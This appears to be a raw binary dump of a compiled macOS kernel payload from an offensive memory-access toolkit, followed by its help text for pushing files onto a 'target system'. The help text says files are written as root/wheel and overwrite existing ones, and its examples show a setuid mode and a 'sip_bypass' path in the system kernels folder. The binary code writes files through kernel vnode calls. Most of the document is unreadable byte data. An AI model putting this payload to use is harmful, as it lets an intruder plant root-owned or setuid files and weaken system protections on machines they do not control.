7�<�:U��dx��nb���y�I+kS�&�S��f��-�       �      B      d                                       VH��H���H�� �  H��^�QH3�H��H���9:1u	< u�H3�YðYø����;u7�  ;Gu-H3�H�__LINKEDH;9tH��H��    t��H�D9HD9�H3��H��H�� �   9t�AH���H���ARWVH��H�������L������L��A�@L+�M��A�HI��I�AH�� ���uA�9I��=���H�� t
��H3�^_AZ�I�A^_AZ� �"�� ��H��WVAVAWH��I��I��H�L$HL�D$PL�L$XL��L��$�   AVL��$�   AVL��$�   AVL��$�   AVL��$�   AVL��$�   AV��I��A_A^^_����H��H�XH�pH�xL�p UH�h�H���   H�E��E�_vnoH�EH�uH�E��E�de_oH�E'3�H�E��E�pen H�E/H��H�E��E�_vnoH�E7L��H�E��E�de_cH�E?H+�H�E��E�loseH�EGH�EH�EO�E �E�_VNO�E�P_WR�E�ITE �E�_uio�E�_add�E�iov �E�_uio�E�_cre�E�ate �E�_uio�E�_fref�E�e �E_vfs�E_con�Etext�E_cur�Erent�E H�I�N����H�H��tH��H��H��r޸   L��$�   I�[I�sI�{ M�s(I��]���H�\$H�t$UWAVH��H��   H�e  H��   �? H���/  H��    �!  H�U��e�����u�  �H��   �  H��@  H��   A�  L�������H�M�����L��   L��H�M�A�  H�D$0H��H�E H�D$(H�d$  ����H��t�  ��~H�M�   E3��T$ D�J�g���L��  H��LC(H��L��   H�M��F���H��t�  ��'H�U E3�H�M�L��L�t$ �"���3ɿ  �H��Eϋ�H��tH�M�H������H�U H��tH�M�M��A�   �����H��   ��  �H��   L��$�   I�[(I�s0I��A^_]�PUSH FILES TO TARGET SYSTEM                                     
APPLE macOS EDITION                                             
=============================================================== 
Push a file from the local system to the target system.         
WARNING! Existing files will be overwritten!                    
* Files created will be created with root/wheel as owner/group  
  and get the access mask specified in the -0 parameter.        
* Files overwritten will keep the access mask and owner/group.  
REQUIRED OPTIONS:                                               
  -in  : file to push to target system from this system.        
         filename is given in normal format.                    
         Example: '-in c:\temp\random.txt'                      
  -s : file on target system.                                   
         Example: '-s /System/Library/Kernels/sip_bypass'       
  -0   : file access mask in HEXADECIMAL OR DECIMAL FORMAT!     
         NB! linux file masks are ususally typed in octal -     
         -rwsr-xr-x 4755 (oct) = 2541 (decimal) = 0x9ed (hex)   
         -rwxrwxrwx  777 (oct) =  511 (decimal) = 0x1ff (hex)   
         Example: '-0 0x1ff'                                    
  -1   : run flag - set to non zero to push file.               
===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================ 
FILE NAME     : %s 
RESULT CODE   : 0x%08X 
=============================================================== 
 